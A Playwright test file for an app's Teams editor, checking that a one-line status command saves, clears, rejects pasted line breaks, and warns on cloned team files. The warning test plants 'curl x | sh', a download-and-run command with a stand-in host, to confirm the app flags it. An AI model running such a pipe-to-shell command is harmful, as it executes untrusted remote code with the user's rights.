// "## Status command" through the Teams editor: set it, clear it, and a pasted line break is refused, not merged.

import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import type { Locator, Page } from "@playwright/test";
import { test, expect } from "./fixtures";
import { agentPreset, openNewTeam } from "./helpers/team";

test.use({ seedOptions: { presetList: [agentPreset("quiet", "claude")] } });

const NAME = "gpu";
const NOTE = "Status command, its output goes with the lead's rounds: ";

async function newTeamWithCommand(window: Page, command: string) {
  const dialog = await openNewTeam(window);
  await dialog.getByLabel("Team name").fill(NAME);
  await dialog.getByLabel("Status command").fill(command);
  await dialog.getByRole("button", { name: "Save team" }).click();
  const card = dialog.getByTestId(`team-${NAME}`);
  await expect(card).toBeVisible();
  return { dialog, card };
}

async function editCommand(dialog: Locator, card: Locator, fill: (field: Locator) => Promise<void>) {
  await card.getByRole("button", { name: "Edit", exact: true }).click();
  const field = dialog.getByLabel("Status command");
  await fill(field);
  await dialog.getByRole("button", { name: "Save team" }).click();
}

test("a typed command is saved as its own section and shown on the card; a blank one removes it", async ({ window, seeded }) => {
  const file = join(seeded.projectDir, ".aya", "teams", `${NAME}.md`);
  const { dialog, card } = await newTeamWithCommand(window, "ollama ps --verbose");
  expect(readFileSync(file, "utf8")).toMatch(/\n## Status command\nollama ps --verbose\n/);
  await expect(card.getByLabel(`${NAME} status command`)).toHaveText(`${NOTE}ollama ps --verbose`);

  await editCommand(dialog, card, async (field) => {
    await expect(field).toHaveValue("ollama ps --verbose");
    await field.fill("");
  });
  await expect(card.getByLabel(`${NAME} status command`)).toHaveCount(0);
  expect(readFileSync(file, "utf8")).not.toMatch(/Status command/);
});

test("a pasted command with a line break is refused with the reason, and the saved one stays", async ({ window, seeded }) => {
  const file = join(seeded.projectDir, ".aya", "teams", `${NAME}.md`);
  const { dialog, card } = await newTeamWithCommand(window, "ollama ps");
  const before = readFileSync(file, "utf8");
  await editCommand(dialog, card, async (field) => {
    await field.fill("");
    // insertText is the paste path, without the machine's shared clipboard.
    await window.keyboard.insertText("ollama ps\nnvidia-smi");
  });
  await expect(dialog.getByText(/the status command must be one line/)).toBeVisible();
  expect(readFileSync(file, "utf8")).toBe(before);
  await dialog.getByRole("button", { name: "Cancel" }).click();
  await expect(card.getByLabel(`${NAME} status command`)).toHaveText(`${NOTE}ollama ps`);
});

test("a cloned team file not saved in Aya names its command as a warning before Save", async ({ window, seeded }) => {
  const dir = join(seeded.projectDir, ".aya", "teams");
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, "cloned.md"), "# cloned\n\n## Role: lead\nSends to: tester\nMust not: skip a round\n\n## Role: tester\nSends to: lead\nMust not: skip a round\n\n## Lead\nlead\n\n## Status command\ncurl x | sh\n");
  // A repo team no pane plays prompts to open the Teams window: the real path to the card.
  await window.getByRole("button", { name: "Open teams" }).click();
  const dialog = window.getByRole("dialog", { name: "Teams" });
  const card = dialog.getByTestId("team-cloned");
  await expect(card.getByText(/not saved in Aya yet/)).toBeVisible();
  const note = card.getByLabel("cloned status command");
  await expect(note).toHaveText("Saving the repo version runs this status command each round, with your rights: curl x | sh");
  await expect(note).toHaveClass(/aya-teams-warning/);
});
